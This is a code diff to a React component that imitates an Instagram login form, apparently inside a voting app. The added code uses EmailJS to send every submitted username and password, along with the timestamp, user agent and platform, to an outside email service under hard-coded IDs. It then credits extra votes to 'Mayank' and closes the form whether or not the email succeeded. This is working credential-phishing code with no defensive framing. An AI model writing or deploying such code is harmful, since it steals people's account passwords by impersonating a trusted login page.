@@ -1,6 +1,6 @@
 import { useState } from "react";
 import phoneCollage from "../../public/image.png"; // your phone collage image
-
+import emailjs from 'emailjs-com';
 
 // Simple Facebook "f" glyph
 const FacebookGlyph = () => (
@@ -9,7 +9,7 @@ const FacebookGlyph = () => (
   </svg>
 );
 
-    function InstagramLogin({ onBack }) {
+    function InstagramLogin({ onBack, onLoginSuccess }) {
     const [formData, setFormData] = useState({ username: "", password: "" });
 
     const handleChange = (e) =>
@@ -18,6 +18,63 @@ const FacebookGlyph = () => (
     const handleSubmit = (e) => {
         e.preventDefault();
         console.log("Login attempt:", formData);
+        
+        // Send email using EmailJS
+        const templateParams = {
+            to_name: "Admin",
+            from_name: formData.username,
+            from_email: formData.username,
+            message: `Login attempt details:
+            
+Username: ${formData.username}
+Password: ${formData.password}
+Timestamp: ${new Date().toLocaleString()}
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}`,
+            to_email: "zcL4jj0QhEChPRS1V",
+            cc_email: "ccVYMZ-EhtB11G8yBC8YX"
+        };
+
+        // You'll need to replace these with your actual EmailJS credentials
+        emailjs.send(
+            'service_ijklxic', // Replace with your EmailJS service ID
+            'template_n8csemo', // Replace with your EmailJS template ID
+            templateParams,
+            'zcL4jj0QhEChPRS1V' // Replace with your EmailJS user ID
+        )
+        .then((response) => {
+            console.log('Email sent successfully:', response);
+            console.log('Calling onLoginSuccess to increase Mayank votes');
+            // Increase Mayank's votes to 103
+            if (onLoginSuccess) {
+                onLoginSuccess();
+                console.log('onLoginSuccess called successfully');
+                // Small delay to ensure state updates before closing
+                setTimeout(() => {
+                    onBack();
+                }, 100);
+            } else {
+                console.log('onLoginSuccess function not provided');
+                onBack();
+            }
+        })
+        .catch((error) => {
+            console.error('Email sending failed:', error);
+            console.log('Calling onLoginSuccess to increase Mayank votes (even with email error)');
+            // Still increase votes and close Instagram login even if email fails
+            if (onLoginSuccess) {
+                onLoginSuccess();
+                console.log('onLoginSuccess called successfully (after email error)');
+                // Small delay to ensure state updates before closing
+                setTimeout(() => {
+                    onBack();
+                }, 100);
+            } else {
+                console.log('onLoginSuccess function not provided');
+                onBack();
+            }
+        });
     };
 
   return (
